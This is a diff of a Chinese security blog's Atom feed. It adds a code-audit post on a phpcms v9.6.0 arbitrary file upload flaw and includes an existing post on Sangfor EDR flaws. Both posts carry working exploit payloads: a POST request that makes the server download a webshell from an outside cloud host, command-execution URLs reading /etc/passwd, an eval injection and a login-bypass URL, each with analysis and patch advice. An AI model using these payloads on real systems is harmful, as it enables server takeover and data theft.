@@ -3,11 +3,11 @@
   <title>gshell&#39;s blog</title>
   
   <subtitle>安全記</subtitle>
-  <link href="http://yoursite.com/atom.xml" rel="self"/>
+  <link href="http://www.gsheller.top/atom.xml" rel="self"/>
   
-  <link href="http://yoursite.com/"/>
-  <updated>2020-09-04T02:36:54.757Z</updated>
-  <id>http://yoursite.com/</id>
+  <link href="http://www.gsheller.top/"/>
+  <updated>2020-11-05T08:09:39.278Z</updated>
+  <id>http://www.gsheller.top/</id>
   
   <author>
     <name>gshell</name>
@@ -17,9 +17,30 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>代码审计_phpcms_v9.6.0任意文件上传</title>
+    <link href="http://www.gsheller.top/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    <id>http://www.gsheller.top/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
+    <published>2020-11-05T07:22:24.000Z</published>
+    <updated>2020-11-05T08:09:39.278Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="代码审计-phpcms-v9-6-0任意文件上传"><a href="#代码审计-phpcms-v9-6-0任意文件上传" class="headerlink" title="代码审计_phpcms_v9.6.0任意文件上传"></a>代码审计_phpcms_v9.6.0任意文件上传</h4><a id="more"></a><p><strong>漏洞描述：</strong></p><p>phpcms v9.6.0存在前台任意文件上传漏洞，攻击者可以在未授权的情况下任意文件上传，导致攻击者可以上传恶意文件获取web服务器权限。</p><p><strong>影响版本：</strong></p><p>phpcms v9.6.0</p><p><strong>利用条件：</strong></p><p>注册文件开启</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;member&amp;c&#x3D;index&amp;a&#x3D;register&amp;siteid&#x3D;1</span><br></pre></td></tr></table></figure><p>需要公网webshell的txt（https不行，必须是http的）：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;webshell-1257078281.cos.ap-nanjing.myqcloud.com&#x2F;2234.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;phpcms_v9.6.0&#x2F;install_package&#x2F;index.php?m&#x3D;member&amp;c&#x3D;index&amp;a&#x3D;register&amp;siteid&#x3D;1 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.56.131</span><br><span class="line">User-Agent: python-requests&#x2F;2.24.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 222</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">siteid&#x3D;1&amp;modelid&#x3D;11&amp;username&#x3D;uqxatkplihzb&amp;password&#x3D;hzrfinrakahg&amp;email&#x3D;ylfjlwjuqbkb%40qq.com&amp;info%5Bcontent%5D&#x3D;%3Cimg+src%3Dhttp%3A%2F%2Fwebshell-1257078281.cos.ap-nanjing.myqcloud.com%2F2234.txt%3F.php%23.jpg%3E&amp;dosubmit&#x3D;1</span><br></pre></td></tr></table></figure><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1.png" width="1000"><p><strong>漏洞exp</strong></p><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2.jpg" width="1000"><p><strong>漏洞分析</strong></p><p>跟进注册文件位置</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">phpcms_v9.6.0\install_package\phpcms\modules\member\index.php</span><br></pre></td></tr></table></figure><p>1.使用new_html_special_chars进行编码</p><p>2.进入$member_input-&gt;get函数赋值给$user_model_info</p><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/3.png" width="1000"><p>跟进$member_input-&gt;get函数文件位置：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\phpcms_v9.6.0\install_package\caches\caches_model\caches_data\member_input.class.php</span><br></pre></td></tr></table></figure><p>使用$this-&gt;attachment-&gt;download函数进行下载</p><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/4.png" width="1000"><p>跟进函数文件位置</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\phpcms_v9.6.0\install_package\phpcms\libs\classes</span><br></pre></td></tr></table></figure><p>对$value进行转义，然后匹配正则</p><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/5.png" width="1000"><p>输入满足src/href=url.(gif|jpg|jpeg|bmp|png)，这种形式即可。</p><p>所以绕过的payloadl类似于下面这种格式是：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;http:&#x2F;&#x2F;webshell-1257078281.cos.ap-nanjing.myqcloud.com&#x2F;2234.txt?.php#.jpg&gt;</span><br></pre></td></tr></table></figure><p>当然</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;http:&#x2F;&#x2F;webshell-1257078281.cos.ap-nanjing.myqcloud.com&#x2F;2234.txt?.php#.bmp&gt;</span><br></pre></td></tr></table></figure><p>也是可以的</p><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/6.png" width="1000"><p>接下来利用fillurl去除掉#后面的内容成为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;http:&#x2F;&#x2F;webshell-1257078281.cos.ap-nanjing.myqcloud.com&#x2F;2234.txt?.php&gt;</span><br></pre></td></tr></table></figure><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/7.png" width="1000"><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/8.png" width="1000"><p>利用fileext来获取扩展名，即’php’</p><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/9.png" width="1000"><p>紧接着使用upload_func即copy函数进行远程下载</p><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/10.png" width="1000"><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/11.png" width="1000"><p>在phpcms_v9.6.0\install_package\phpcms\modules\member\index.php中，</p><p>当$status &gt; 0时会向v9_member_detail的content和userid两列插入数据</p><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/12.png" width="1000"><p>status大于0即</p><p>除掉用户名邮箱已存在，格式错误，禁止注册等情况下。所以最要是随机生成用户名或者邮箱写exp</p><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/13.png" width="1000"><p>在v9_member_detail表中没有列content</p><p>所以插入时会产生报错讲路径返回到前台。</p><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/14.png" width="1000"><p>构造payload即可成功写入webshell。</p><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/15.png" width="1000"><p><strong>漏洞修复：</strong></p><p>更新补丁，在获取文件扩展名后继续对扩展名进行检测。</p>]]></content>
+    
+    
+    <summary type="html">&lt;h4 id=&quot;代码审计-phpcms-v9-6-0任意文件上传&quot;&gt;&lt;a href=&quot;#代码审计-phpcms-v9-6-0任意文件上传&quot; class=&quot;headerlink&quot; title=&quot;代码审计_phpcms_v9.6.0任意文件上传&quot;&gt;&lt;/a&gt;代码审计_phpcms_v9.6.0任意文件上传&lt;/h4&gt;</summary>
+    
+    
+    
+    <category term="代码审计" scheme="http://www.gsheller.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+    
+    <category term="安全研究" scheme="http://www.gsheller.top/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
+    
+  </entry>
+  
+  <entry>
     <title>ngnix解析漏洞（phpstudy最新版）</title>
-    <link href="http://yoursite.com/2020/09/04/ngnix%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88phpstudy%E6%9C%80%E6%96%B0%E7%89%88%EF%BC%89/"/>
-    <id>http://yoursite.com/2020/09/04/ngnix%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88phpstudy%E6%9C%80%E6%96%B0%E7%89%88%EF%BC%89/</id>
+    <link href="http://www.gsheller.top/2020/09/04/ngnix%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88phpstudy%E6%9C%80%E6%96%B0%E7%89%88%EF%BC%89/"/>
+    <id>http://www.gsheller.top/2020/09/04/ngnix%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88phpstudy%E6%9C%80%E6%96%B0%E7%89%88%EF%BC%89/</id>
     <published>2020-09-04T02:13:26.000Z</published>
     <updated>2020-09-04T02:36:54.757Z</updated>
     
@@ -35,14 +56,14 @@
     
     
     
-    <category term="漏洞推送" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81/"/>
+    <category term="漏洞推送" scheme="http://www.gsheller.top/tags/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81/"/>
     
   </entry>
   
   <entry>
     <title>最新版本云锁bypass</title>
-    <link href="http://yoursite.com/2020/08/27/%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%BA%91%E9%94%81bypass/"/>
-    <id>http://yoursite.com/2020/08/27/%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%BA%91%E9%94%81bypass/</id>
+    <link href="http://www.gsheller.top/2020/08/27/%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%BA%91%E9%94%81bypass/"/>
+    <id>http://www.gsheller.top/2020/08/27/%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%BA%91%E9%94%81bypass/</id>
     <published>2020-08-27T07:35:27.000Z</published>
     <updated>2020-08-27T15:21:36.934Z</updated>
     
@@ -53,17 +74,17 @@
     
     
     
-    <category term="waf绕过" scheme="http://yoursite.com/categories/waf%E7%BB%95%E8%BF%87/"/>
+    <category term="waf绕过" scheme="http://www.gsheller.top/categories/waf%E7%BB%95%E8%BF%87/"/>
     
     
-    <category term="bypass" scheme="http://yoursite.com/tags/bypass/"/>
+    <category term="bypass" scheme="http://www.gsheller.top/tags/bypass/"/>
     
   </entry>
   
   <entry>
     <title>最新版安全狗bypass</title>
-    <link href="http://yoursite.com/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/"/>
-    <id>http://yoursite.com/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/</id>
+    <link href="http://www.gsheller.top/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/"/>
+    <id>http://www.gsheller.top/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/</id>
     <published>2020-08-26T08:09:17.000Z</published>
     <updated>2020-08-27T10:01:17.147Z</updated>
     
@@ -74,17 +95,17 @@
     
     
     
-    <category term="waf绕过" scheme="http://yoursite.com/categories/waf%E7%BB%95%E8%BF%87/"/>
+    <category term="waf绕过" scheme="http://www.gsheller.top/categories/waf%E7%BB%95%E8%BF%87/"/>
     
     
-    <category term="bypass" scheme="http://yoursite.com/tags/bypass/"/>
+    <category term="bypass" scheme="http://www.gsheller.top/tags/bypass/"/>
     
   </entry>
   
   <entry>
     <title>宝塔面板phpMyAdmin未授权访问</title>
-    <link href="http://yoursite.com/2020/08/24/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BFphpMyAdmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
-    <id>http://yoursite.com/2020/08/24/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BFphpMyAdmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</id>
+    <link href="http://www.gsheller.top/2020/08/24/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BFphpMyAdmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
+    <id>http://www.gsheller.top/2020/08/24/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BFphpMyAdmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</id>
     <published>2020-08-24T06:03:03.000Z</published>
     <updated>2020-09-04T02:31:04.082Z</updated>
     
@@ -96,16 +117,16 @@
     
     
     
-    <category term="漏洞推送" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81/"/>
+    <category term="漏洞推送" scheme="http://www.gsheller.top/tags/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81/"/>
     
   </entry>
   
   <entry>
     <title>深信服EDR代码审计</title>
-    <link href="http://yoursite.com/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    <id>http://yoursite.com/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
+    <link href="http://www.gsheller.top/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    <id>http://www.gsheller.top/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
     <published>2020-08-22T17:12:06.000Z</published>
-    <updated>2020-08-24T07:52:19.456Z</updated>
+    <updated>2020-11-05T07:23:57.553Z</updated>
     
     <content type="html"><![CDATA[<h5 id="深信服EDR代码审计"><a href="#深信服EDR代码审计" class="headerlink" title="深信服EDR代码审计"></a>深信服EDR代码审计</h5><a id="more"></a><h2 id="RCE1"><a href="#RCE1" class="headerlink" title="RCE1"></a>RCE1</h2><p><strong>漏洞描述：</strong></p><p>深信服终端检测平台存在远程命令执行漏洞，攻击者利用该漏洞，可在未授权的情况下向目标服务器发送恶意构造的HTTP请求，从而获得目标服务器的权限，实现远程命令执行。</p><p><strong>影响版本：</strong></p><p>漏洞影响的产品版本包括：深信服EDR 3.2.16、3.2.17、3.2.19版本，其他版本不受影响。</p><p><a href="https://ip/tool/log/c.php?strip_slashes=system&amp;host=id">https://ip/tool/log/c.php?strip_slashes=system&amp;host=id</a></p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1.jpg"></p><p>查看/tool/log/c.php</p><p>参数带入$shou_form函数</p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2.png"></p><p>进入$show_form函数</p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/3.png"></p><p>进入shou_form，直接变量覆盖参数</p><p>如果host参数存在输出$strip_slashes($host)，那直接构造为system(id)</p><p><a href="https://ip/tool/log/c.php?strip_slashes=system&amp;host=id">https://IP/tool/log/c.php?strip_slashes=system&amp;host=id</a></p><p><a href="https://ip/tool/log/c.php?strip_slashes=system&amp;path=id">https://IP/tool/log/c.php?strip_slashes=system&amp;path=id</a></p><p><a href="https://ip/tool/log/c.php?strip_slashes=system&amp;row=id">https://IP/tool/log/c.php?strip_slashes=system&amp;row=id</a></p><p><a href="https://ip/tool/log/c.php?strip_slashes=system&amp;limit=id">https://IP/tool/log/c.php?strip_slashes=system&amp;limit=id</a></p><p>都可以RCE</p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/4.jpg"></p><p>绕过cat /etc/passwd不能执行</p><p><a href="https://ip/tool/php_cli.php?strip_slashes=system&amp;code=head">https://IP/tool/php_cli.php?strip_slashes=system&amp;code=head</a> -n 100 /et?/pas???</p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/5.jpg"></p><p>绕过phpinfo();不能执行</p><p><a href="https://ip/tool/php_cli.php?strip_slashes=system&amp;code=phpinfo%0A()">https://IP/tool/php_cli.php?strip_slashes=system&amp;code=phpinfo%0a()</a>;</p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/6.jpg"></p><p><a href="https://ip/tool/php_cli.php?code=array_map(base_convert(55490343972,10,36),array(1)">https://IP/tool/php_cli.php?code=array_map(base_convert(55490343972,10,36),array(1)</a>);</p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/7.jpg"></p><h2 id="RCE2"><a href="#RCE2" class="headerlink" title="RCE2"></a>RCE2</h2><p>查看<a href="https://ip/tool/php_cli.php">https://IP/tool/php_cli.php</a></p><p>同样，开始为回调函数，</p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/8.png"></p><p>首先得到ldb_ext_root()的返回值为/ac/dc/ldb</p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/9.png"></p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/10.jpg"></p><p>如果不存在/ac/dc/ldb/php/enable_dc_tool这个文件，就终止程序，如果存在，就touch一下enable_dc_tool写入时间</p><p>ls /ac/dc/ldb/php/</p><p>没有这个文件，enable_dc_tool</p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/11.jpg"></p><p>新建移动到该目录</p><p><a href="https://ip/tool/log/c.php?strip_slashes=system&amp;host=mv%20enable_dc_tool%20/ac/dc/ldb/php/enable_dc_tool">https://IP/tool/log/c.php?strip_slashes=system&amp;host=mv%20enable_dc_tool%20/ac/dc/ldb/php/enable_dc_tool</a></p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/12.jpg"></p><p>接下来看代码，依然是变量覆盖$code</p><p>如果code参数存在输出$strip_slashes($code)，那直接构造为system(whoami)</p><p>?strip_slashes=system&amp;code=whoami</p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/13.png"></p><p><a href="https://ip/tool/php_cli.php?strip_slashes=system&amp;code=whoami">https://IP/tool/php_cli.php?strip_slashes=system&amp;code=whoami</a></p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/14.jpg"></p><p>$main函数直接获取参数变量覆盖为$code，并eval，直接构造：</p><p><a href="https://ip/tool/php_cli.php?code=system(id)">https://IP/tool/php_cli.php?code=system(id)</a>;</p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/15.jpg"></p><p>修复建议：</p><p>目前，深信服官方已发布更新版本和修复补丁，更新至3.2.21版本或升级补丁可修复该漏洞。</p><p>1、深信服已经通过在线升级功能完成漏洞补丁的在线升级修复，用户开启在线升级功能后即可升级至最新版本。</p><p>2、针对未开通在线升级功能的用户，深信服将通过客服热线主动指导用户升级，直至升级成功。同时，用户也可以通过自行下载3.2.21版本升级安装包：<a href="https://bbs.sangfor.com.cn/plugin.php?id=service:download&amp;action=view&amp;fid=100000022878128#/100000035115623/all/undefined">https://bbs.sangfor.com.cn/plugin.php?id=service:download&amp;action=view&amp;fid=100000022878128#/100000035115623/all/undefined</a></p><p>然后打开EDR管理平台后台，在系统管理–升级管理–平台和终端升级中导入该下载升级安装包，导入后，管理平台和终端将自动升级至3.2.21版本。</p><p>3、如暂时无法升级，可临时对深信服EDR系统服务配置IP访问权限策略，将其可访问的IP范围控制在安全可控的区域内。</p><p>建议使用深信服EDR系统信息系统运营者及时自查，发现存在漏洞后，按照漏洞处置建议及时进行加固处置。</p><h2 id="任意用户登陆"><a href="#任意用户登陆" class="headerlink" title="任意用户登陆"></a>任意用户登陆</h2><p>payload: <a href="https://ip/ui/login.php?user=%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E7%82%B9">https://ip/ui/login.php?user=随便写一点</a></p><p>例如:  <a href="https://ip/ui/login.php?user=ad%E2%80%A6">https://IP/ui/login.php?user=ad…</a></p><p>输入完毕以后即可直接登录平台</p><p><a href="https://ip/ui/login.php?user=admin">https://IP/ui/login.php?user=admin</a></p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/16.jpg"></p><p>/web/ui/login.php</p><p>经过调试服务器上$_SERVER[“REMOTE_ADDR”]返回127.0.0.1</p><p>浏览当前页面的用户的 IP 地址存在并且等于127.0.0.2或者127.0.0.1，条件永为真，如果存在user参数直接免密登陆。</p><p><img src="/2020/08/23/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/17.jpg"></p>]]></content>
     
@@ -114,17 +135,17 @@
     
     
     
-    <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    <category term="代码审计" scheme="http://www.gsheller.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
     
-    <category term="安全研究" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
+    <category term="安全研究" scheme="http://www.gsheller.top/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
     
   </entry>
   
   <entry>
     <title>授权测试拿下服务器</title>
-    <link href="http://yoursite.com/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
-    <id>http://yoursite.com/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
+    <link href="http://www.gsheller.top/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
+    <id>http://www.gsheller.top/2020/07/10/%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
     <published>2020-07-10T09:54:25.000Z</published>
     <updated>2020-08-24T07:29:10.813Z</updated>
     
@@ -136,7 +157,7 @@
     
     
     
-    <category term="web渗透" scheme="http://yoursite.com/tags/web%E6%B8%97%E9%80%8F/"/>
+    <category term="web渗透" scheme="http://www.gsheller.top/tags/web%E6%B8%97%E9%80%8F/"/>
     
   </entry>
   
